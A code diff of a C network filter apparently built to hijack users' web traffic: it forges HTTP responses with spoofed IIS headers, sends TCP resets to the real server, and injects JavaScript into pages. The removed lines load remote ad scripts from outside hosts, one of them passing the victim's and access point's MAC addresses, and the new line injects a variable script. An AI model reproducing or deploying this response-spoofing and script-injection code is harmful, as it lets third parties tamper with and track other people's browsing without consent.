@@ -173,58 +173,6 @@ void* filter_thread(void* lp)
 
 	if( js ){
 		
-		// 组成body
-		char body[1024] = {0};
-
-	//	snprintf(body, 1023, "<html><body style='margin:0'>"
-	//			"<iframe scrolling=\"yes\" style=\"width:100%%; height:100%%; z-index:1; border: 0px;\" src=\"%s?noCache=%d\"></iframe>\r\n"
-	//			"\r\n<script src=\"http://mob.yuanzhenginfo.com/gd/g.js\"></script>"
-	//			"</body></html>",
-	//			domain, rand() );
-	/*
-		snprintf(body, 1023,
-			"<html>\r\n<head>\r\n"
-			"<meta content=\"no-cache,must-revalidate\" http-equiv=\"Cache-Control\">\r\n"
-			"<meta content=\"no-cache\" http-equiv=\"pragma\">\r\n"
-			"<meta content=\"0\" http-equiv=\"expires\">\r\n"
-			"<meta content=\"width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no\" name=\"viewport\">\r\n"
-			"<meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\r\n"
-			"<meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black-translucent\">\r\n"
-			"<meta content=\"telephone=no\" name=\"format-detection\" />\r\n"
-			"</head>\r\n"
-			"<body style='margin:0'>\r\n"
-			"<iframe scrolling=\"yes\" style=\"width:100%%; height:100%%; z-index:1; border: 0px;\" src=\"%s?NOCACHE=%d\"></iframe>\r\n"
-			"<script src=\"http://mob.yuanzhenginfo.com/gd/g.js\"></script>\r\n"
-			"</body>\r\n</html>",
-			domain, rand() );
-	*/
-		/*
-		snprintf(body, 1023,
-			"<html>\r\n<head>\r\n"
-			"<meta content=\"no-cache,must-revalidate\" http-equiv=\"Cache-Control\">\r\n"
-			"<meta content=\"no-cache\" http-equiv=\"pragma\">\r\n"
-			"<meta content=\"0\" http-equiv=\"expires\">\r\n"
-			"<meta content=\"width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no\" name=\"viewport\">\r\n"
-			"<meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\r\n"
-			"<meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black-translucent\">\r\n"
-			"<meta content=\"telephone=no\" name=\"format-detection\" />\r\n"
-			"</head>\r\n"
-			"<body style='margin:0'>\r\n"
-			"<iframe scrolling=\"yes\" style=\"width:100%%; height:100%%; z-index:1; border: 0px;\" src=\"%s?NOCACHE=%d\"></iframe>\r\n"
-			"<script type=\"text/javascript\" src=\"http://un.winasdaq.com/ydap.js?ydcp_id=10020&"
-			"cumid=%02x:%02x:%02x:%02x:%02x:%02x&apmac=%02x:%02x:%02x:%02x:%02x:%02x\"></script>\r\n"
-			"</body>\r\n</html>",
-			domain, rand()
-			,ethhdr->h_dest[0], ethhdr->h_dest[1], ethhdr->h_dest[2], ethhdr->h_dest[3], ethhdr->h_dest[4], ethhdr->h_dest[5]
-			,ethhdr->h_source[0], ethhdr->h_source[1], ethhdr->h_source[2], ethhdr->h_source[3], ethhdr->h_source[4], ethhdr->h_source[5]
-			);
-		*/
-		snprintf(body, 1023,
-				"var divObj = document.createElement(\"div\");\r\n"
-				"divObj.innerHTML = '<img style=\"position: fixed; bottom: 0px;\" style=\"width: 100%%;\" src=\"http://960one.cn/style/images/1389083288.jpg\">';\r\n"
-				"var first = document.body.firstChild;\r\n"
-				"document.body.insertBefore(divObj, first);");
-		snprintf(body, 1023, "document.write(\"<script language=javascript src='http://ad.yuanzhenginfo.com/ad/7.js'></script>\");");
 		// 组成回复包内容
 		char buf[4096] = {0};
 		/*
@@ -248,7 +196,7 @@ void* filter_thread(void* lp)
 				"Server: Microsoft-IIS/8.0\r\n"
 				"X-Powered-By: ASP.NET\r\n"
 				"Date: Tue, 05 Jul 2016 06:02:52 GMT\r\n"
-				"Content-Length: %lu\r\n\r\n%s", strlen(body), body);
+				"Content-Length: %lu\r\n\r\n%s", strlen(js), js);
 		// 重置掉服务器的连接
 		send_rst_test(ip, tcp, data_len);
 		// 生成伪装包并发送给用户
